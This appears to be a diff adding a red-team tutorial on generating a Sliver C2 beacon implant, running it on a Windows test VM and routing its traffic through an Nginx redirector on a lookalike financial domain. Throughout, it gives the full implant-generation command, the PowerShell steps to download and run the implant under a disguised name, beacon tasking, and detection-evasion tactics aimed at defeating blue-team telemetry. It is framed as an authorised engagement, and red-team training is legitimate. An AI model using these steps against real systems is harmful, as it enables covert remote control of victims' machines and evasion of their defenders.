@@ -1,0 +1,485 @@
+# Day 3: Generating and Testing Your Sliver Implant
+
+---
+
+## Where We Left Off
+
+Yesterday we completed the infrastructure build. You have:
+- A C2 server VM running Sliver with an HTTPS listener active on port 8443
+- A redirector VM running Nginx with a Let's Encrypt SSL certificate for `updates.ceruleanpay.online`
+- DNS configured so `updates.ceruleanpay.online` points to the redirector
+- Nginx proxy rules that forward requests starting with `/api/v1/updates`, `/static/js/`, or `/login/oauth/` to the C2 server, while deflecting scanners to a fake landing page
+
+Today is the final phase. We are going to generate our first implant, transfer it to a test Windows VM, run it, and verify that the connection works through the redirector. We will also check the network telemetry from a blue team perspective to confirm our OPSEC is solid and our C2 server remains hidden.
+
+Let's get into it.
+
+---
+
+## Understanding Sliver Payloads
+
+Sliver has two types of payloads:
+
+**Stagers:** A stager is a very small binary that does not contain the C2 engine. Its only job is to connect to the C2 server, download the actual C2 payload (the stage) directly into memory, and execute it. Stagers are useful when you have size constraints (e.g., exploiting a buffer overflow where you can only inject 500 bytes of shellcode). However, they are loud. The second-stage download is an unencrypted or easily inspectable network transfer of a large executable file, which modern EDRs detect instantly.
+
+**Implants (Stageless):** A stageless implant is a complete, self-contained binary that contains the entire Sliver C2 engine. It does not need to download anything from the network to run. It runs immediately. It is larger in size (around 10-15 MB because it includes Go's runtime and all libraries), but it is much safer for OPSEC because there is no secondary download phase.
+
+**For this engagement, we use stageless implants (Beacons).** We do not use stagers. The size is not an issue for our target, and the OPSEC benefit of avoiding stage downloads is critical.
+
+---
+
+## Step 1: Generate the Beacon Implant
+
+We will generate the implant from the Sliver console on the **C2 server VM**.
+
+SSH into your C2 server and start the console:
+
+```bash
+sudo sliver-server
+```
+
+Once in the console (`sliver >`), look at the command to generate a beacon.
+
+```
+sliver > generate beacon --help
+```
+
+We need to configure specific flags:
+- `--http`: The callback URL. This MUST point to our redirector domain, using HTTPS, on port 443: `https://updates.ceruleanpay.online`.
+- `--os`: Target operating system. We are testing on a Windows VM, so `windows`.
+- `--arch`: Architecture. `amd64`.
+- `--skip-symbols`: Strips debugging symbols from the binary. This reduces the file size and removes compiler metadata that EDRs use to create signatures.
+- `--seconds`: The check-in interval. We will use `60` seconds.
+- `--jitter`: The randomness in the check-in timing. We will use `15` seconds. This means the check-in will happen randomly between 45 and 75 seconds.
+- `--http-path`: The URL paths the implant uses for communication. Remember our Nginx proxy rule from yesterday? Nginx only forwards traffic that matches specific paths. We will tell Sliver to use `/api/v1/updates` (which matches our proxy rule).
+
+### Run the Generation Command
+
+```
+sliver > generate beacon --http https://updates.ceruleanpay.online --os windows --arch amd64 --skip-symbols --seconds 60 --jitter 15 --http-path api/v1/updates --save /home/c2admin/
+```
+
+Output you will see:
+
+```
+[*] Active beaconly payload configurations:
+[*] Option             Value
+[*] ======             =====
+[*] LHOSTS             updates.ceruleanpay.online
+[*] Port               443
+[*] Protocol           https
+[*] OS/Arch            windows/amd64
+[*] Interval           60s
+[*] Jitter             15s
+[*] HTTP Path          api/v1/updates
+[*] Skip Symbols       true
+
+[*] Compiling implant, please wait...
+[*] Symbol obfuscation enabled
+[*] Successfully compiled implant
+[*] Saved implant to: /home/c2admin/OBFUSCATED_NAME.exe
+```
+
+Sliver generates a random, obfuscated name for the file (e.g., `SILVER_BULLET.exe` or `DANCING_BEAR.exe`). Note this name. For this guide, we will refer to it as `implant.exe`.
+
+Exit the Sliver console for a moment (type `exit` or `ctrl+d`) to copy the file.
+
+---
+
+## Step 2: Transfer the Payload to the Windows Test VM
+
+In a real engagement, transferring the payload to the target host (initial access) is a complex phase. You might use phishing, exploit delivery, or USB drop.
+
+For our testing phase, we just need a direct, safe way to copy the binary to our isolated Windows 10/11 VM. We will use Python's built-in HTTP server on our operator machine as an intermediate step.
+
+### Copy from C2 Server to Operator Machine
+
+On your **operator machine** (not the VM), open a terminal and pull the file from the C2 server using `scp`:
+
+```bash
+# Replace OBFUSCATED_NAME.exe with the actual name generated by Sliver
+scp c2admin@C2_SERVER_IP:/home/c2admin/OBFUSCATED_NAME.exe ~/Downloads/implant.exe
+```
+
+Enter your VM password when prompted.
+
+### Run a Temporary HTTP Server on the Operator Machine
+
+On your operator machine, start a web server in the folder where you saved the file:
+
+```bash
+cd ~/Downloads
+python3 -m http.server 8080
+```
+
+You should see: `Serving HTTP on 0.0.0.0 port 8080 ...`
+
+### Download the File on the Windows Test VM
+
+Now, switch to your **Windows test VM**.
+
+1. Open PowerShell.
+2. Download the file from your operator machine's IP (replace `OPERATOR_IP` with your operator machine's local network IP):
+
+```powershell
+Invoke-WebRequest -Uri "http://OPERATOR_IP:8080/implant.exe" -OutFile "$env:TEMP\update_service.exe"
+```
+
+Verify the file downloaded successfully:
+
+```powershell
+ls "$env:TEMP\update_service.exe"
+```
+
+You should see the file size (around 10-15 MB).
+
+Once the download is complete, go back to your operator machine terminal and stop the python server (Ctrl+C).
+
+---
+
+## Step 3: Start the Sliver Interactive Console
+
+Before you run the implant on the Windows machine, make sure you are in the Sliver console on the C2 server ready to receive the check-in.
+
+SSH back into the C2 server and start Sliver:
+
+```bash
+sudo sliver-server
+```
+
+Verify your HTTPS listener is running:
+
+```
+sliver > jobs
+```
+
+Expected output:
+
+```
+ ID   Name    Protocol   Port   Domains
+==== ======== ========== ====== =========
+ 1   https    tcp        8443
+```
+
+Verify you have no active beacons yet:
+
+```
+sliver > beacons
+```
+
+Expected output: `No beacons available.`
+
+Now we are ready.
+
+---
+
+## Step 4: Execute the Implant on the Windows VM
+
+On the **Windows test VM**, run the downloaded binary.
+
+In your PowerShell window:
+
+```powershell
+cd $env:TEMP
+.\update_service.exe
+```
+
+The command prompt will return immediately or show a blank line. The process runs in the background.
+
+Verify it is running in memory:
+
+```powershell
+Get-Process update_service
+```
+
+Expected output:
+
+```
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    250      15    12000      28000       0.05   4321   1 update_service
+```
+
+The process is running and has a PID (e.g., `4321`).
+
+---
+
+## Step 5: Verify the Connection in the Sliver Console
+
+Now switch back to your **Sliver console on the C2 server**.
+
+Because we set a check-in interval of 60 seconds with 15 seconds jitter, the first check-in will happen within 45 to 75 seconds.
+
+Wait. You will see a notification message in the console:
+
+```
+[*] Beacon 1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d (DESKTOP-TARGET\testuser) - updates.ceruleanpay.online - 192.168.1.100:54321 (updates.ceruleanpay.online) - active
+```
+
+The beacon has checked in.
+
+List active beacons:
+
+```
+sliver > beacons
+```
+
+Expected output:
+
+```
+ ID         Name       Transport   Username               Hostname         IP                     Status
+========== ========== =========== ====================== ================ ===================== ========
+ 1a2b3c4d   DANCING_B  https       DESKTOP-TARGET\user    DESKTOP-TARGET   192.168.1.100:54321    Active
+```
+
+**Notice the details:**
+- **ID:** `1a2b3c4d` (the unique identifier for this beacon)
+- **Transport:** `https`
+- **IP:** `192.168.1.100` (the actual internal IP of the Windows host, passed through the `X-Forwarded-For` header by Nginx)
+- **Status:** `Active`
+
+You have successfully established C2 connection through the redirector domain.
+
+---
+
+## Step 6: Interact with the Beacon
+
+Let's interact with the beacon to verify we can run commands.
+
+In the Sliver console, select the beacon by its ID (or index/name):
+
+```
+sliver > use 1a2b3c4d
+```
+
+Your prompt changes:
+
+```
+sliver [beacon] DANCING_B >
+```
+
+Remember: **this is a beacon, not an interactive session.** When you type a command here, Sliver does not run it immediately. It queues the command. On the next check-in (within 60 seconds), the implant pulls the command, runs it, and queues the output. On the check-in after that, you see the results.
+
+Let's queue a basic, safe reconnaissance command:
+
+```
+sliver [beacon] DANCING_B > info
+```
+
+Output you will see:
+
+```
+[*] Tasked beacon DANCING_B (1a2b3c4d) with task #1
+```
+
+Now wait. Within 60 seconds, the beacon checks in. You will see:
+
+```
+[*] Beacon DANCING_B (1a2b3c4d) completed task #1
+
+[*] Beacon Info:
+[*] ID: 1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d
+[*] Hostname: DESKTOP-TARGET
+[*] OS: windows/amd64
+[*] Active Process: update_service.exe (PID: 4321)
+[*] User: DESKTOP-TARGET\testuser
+[*] Check-in Interval: 60s
+[*] Jitter: 15s
+```
+
+The command completed successfully. The data traveled: C2 Server -> Redirector (proxy) -> Target VM -> running process -> collected details -> encrypted HTTPS post back -> Redirector (proxy) -> C2 Server.
+
+---
+
+## Step 7: Check Network Telemetry (The Blue Team's Perspective)
+
+Now let's check what the blue team sees. We want to verify that our infrastructure is genuinely hiding the C2 server IP and blending in.
+
+### 1. View Active Connections on the Windows Host
+
+On the **Windows test VM**, open a new PowerShell window and check active network connections for our process PID (which we saw was `4321`):
+
+```powershell
+netstat -ano | findstr 4321
+```
+
+Because this is a beacon, here is what you will actually see most of the time:
+
+**Absolutely nothing.**
+
+Why? Because the beacon connects, sends/receives data, and immediately closes the connection. The connection is open for less than a second. During the 60-second sleep interval, the socket is closed. There is no active TCP connection to see.
+
+This is a massive OPSEC advantage over "Session" mode, where `netstat` would show an established TCP connection to your redirector's IP indefinitely.
+
+To catch the connection, you would have to run `netstat` in a loop at the exact second the beacon checks in.
+
+If you manage to catch it, you will see:
+
+```
+TCP    192.168.1.100:54321    REDIRECTOR_PUBLIC_IP:443    ESTABLISHED    4321
+```
+
+**Notice what is visible here:**
+- The remote address is `REDIRECTOR_PUBLIC_IP`.
+- The port is `443` (HTTPS).
+- The actual C2 server IP is **nowhere to be found**. The Windows host has no socket connection, no routing entries, and no memory references to the C2 server's real IP. It only knows about the redirector.
+
+### 2. Inspect Traffic with Wireshark
+
+On the Windows test VM, run Wireshark (or use `tcpdump` if you are on a Linux target) to capture traffic during a check-in.
+
+Filter the traffic by your redirector IP:
+
+```
+ip.addr == REDIRECTOR_PUBLIC_IP
+```
+
+Wait for a check-in. You will capture a standard TLS 1.3 handshake followed by Application Data packets.
+
+Analyze the packets:
+
+#### The DNS Query
+Before connecting, the Windows host queries its DNS server:
+
+```
+Standard query 0x1234 A updates.ceruleanpay.online
+Standard query response 0x1234 A updates.ceruleanpay.online A REDIRECTOR_PUBLIC_IP
+```
+
+This looks like any normal DNS lookup for a web service.
+
+#### The TLS Client Hello
+The TCP handshake completes on port 443, and the client sends a `Client Hello`:
+
+```
+Extension: server_name (len=26)
+    Server Name Indication extension
+        Server Name: updates.ceruleanpay.online
+```
+
+This is the SNI (Server Name Indication). It shows the domain we are connecting to: `updates.ceruleanpay.online`. This matches the domain in the URL, which looks normal.
+
+#### The Certificate Exchange
+The redirector responds with its certificate. The cert issuer is:
+
+```
+Issuer: C = US, O = Let's Encrypt, CN = R3
+Subject: CN = updates.ceruleanpay.online
+```
+
+This is a valid certificate signed by a globally trusted authority. No self-signed warnings.
+
+#### The HTTP Request (Encrypted)
+Once the TLS session is established, the HTTP request is sent inside the encrypted channel.
+The blue team cannot read the headers or the path because TLS 1.3 encrypts everything after the handshake.
+
+However, if they were running an SSL decryption proxy (decrypting HTTPS at the firewall level), they would see:
+
+```http
+POST /api/v1/updates HTTP/1.1
+Host: updates.ceruleanpay.online
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Content-Type: application/octet-stream
+Content-Length: 1048
+
+[Encrypted Sliver Payload]
+```
+
+Even with SSL decryption, they see:
+- Host header matching a financial domain (`updates.ceruleanpay.online`)
+- Path matching a typical API update check (`/api/v1/updates`)
+- User-Agent matching a standard Windows Edge browser
+- Content encrypted via Sliver's internal asymmetric keys (so even inside the decrypted TLS session, the data looks like random binary noise, not command text)
+
+The C2 server's IP is completely hidden. The traffic footprint is minimal and blends in with normal API traffic.
+
+---
+
+## Step 8: Troubleshooting Common Connection Issues
+
+If your implant runs on the Windows VM but you see no check-in in the Sliver console, walk through this checklist in order.
+
+### 1. DNS Resolution Failure
+The Windows VM must be able to resolve `updates.ceruleanpay.online` to the redirector IP.
+
+**Test:** On the Windows VM, run:
+```powershell
+Resolve-DnsName updates.ceruleanpay.online
+```
+If it fails to return an IP or returns an error, the target VM has DNS resolution issues or the DNS record has not fully propagated yet.
+
+### 2. Network Routing/Firewall Blocking
+The target VM must be able to reach the redirector VM on port 443.
+
+**Test:** On the Windows VM, run:
+```powershell
+Test-NetConnection -ComputerName updates.ceruleanpay.online -Port 443
+```
+Expected output: `TcpTestSucceeded : True`.
+If it says `False`, then port 443 is blocked. Check:
+- Is Nginx running on the redirector? (`sudo systemctl status nginx`)
+- Is UFW blocking port 443 on the redirector?
+- Is the Azure NSG blocking port 443 on the redirector?
+
+### 3. Nginx Forwarding Issues (502 Bad Gateway)
+Nginx is receiving the request but cannot forward it to the C2 server.
+
+**Test:** On the redirector VM, check the error logs:
+```bash
+sudo tail -n 20 /var/log/nginx/c2_error.log
+```
+If you see error messages like:
+`connect() failed (111: Connection refused) while connecting to upstream, client: TARGET_IP, server: updates.ceruleanpay.online, request: "POST /api/v1/updates ..."`
+
+This means Nginx cannot reach Sliver. Check:
+- Is Sliver running on the C2 server? (`sudo systemctl status sliver`)
+- Is UFW blocking port 8443 on the C2 server?
+- Is the Azure NSG blocking port 8443 on the C2 server?
+- Verify the upstream IP in `/etc/nginx/sites-available/c2_redirector` is the correct C2 server public IP.
+
+### 4. Path Mismatch
+If Nginx receives the request but the path does not match the proxy location rule, Nginx will serve the fake landing page (200 OK) instead of forwarding the request to Sliver.
+
+**Test:** On the redirector VM, check the access logs:
+```bash
+sudo tail -n 20 /var/log/nginx/c2_access.log
+```
+Look at the request path:
+`TARGET_IP - - [Date] "POST /some_other_path HTTP/2.0" 200 ...`
+
+If the response code is `200` and it is serving the landing page, the implant is connecting to a path that Nginx does not proxy.
+**Fix:** You must regenerate the implant with the correct path flag (`--http-path api/v1/updates`) or edit your Nginx configuration location rule to match the path the implant is using.
+
+### 5. Clock Desynchronization
+Sliver uses time-based security mechanisms for some transports. If the clock on the C2 server and the clock on the target VM are off by more than a few minutes, the connection might be rejected.
+
+**Fix:** Ensure both the C2 server and the Windows target VM have NTP enabled and their clocks are accurate.
+On Ubuntu:
+```bash
+sudo timedatectl set-ntp on
+```
+On Windows:
+```powershell
+w32tm /resync
+```
+
+---
+
+## Summary of the Completed Infrastructure
+
+Congratulations. You have successfully built, secured, and verified a professional-grade C2 redirector infrastructure.
+
+Here is the final state of your setup:
+
+1. **The C2 Server:** Hidden inside the VNet. Only accepts connections from the redirector's IP on port 8443. Runs the Sliver server service. Holds your operator sessions.
+2. **The Redirector:** Faces the internet. Runs Nginx with a Let's Encrypt certificate. Serves a legitimate-looking merchant portal documentation page to scanners and investigators.
+3. **The DNS Layer:** Subdomain `updates.ceruleanpay.online` resolves to the redirector.
+4. **The Implant:** Executed on the target host. Beacons over HTTPS on port 443. Sockets are closed during sleep intervals to prevent detection. Connects only to the redirector.
+
+This is a resilient, secure-by-default architecture that ensures operational security throughout the engagement. If a defender blocks your domain or redirector IP, your backend infrastructure is unaffected. You rotate the redirector and continue the operation.
+
+You are ready for the first engagement.
+
+---
+
+**Next Step:** You can now connect your operator client to the server and begin your post-exploitation plan as defined by the Rules of Engagement. Remember the OPSEC checklist at all times. Good hunting.
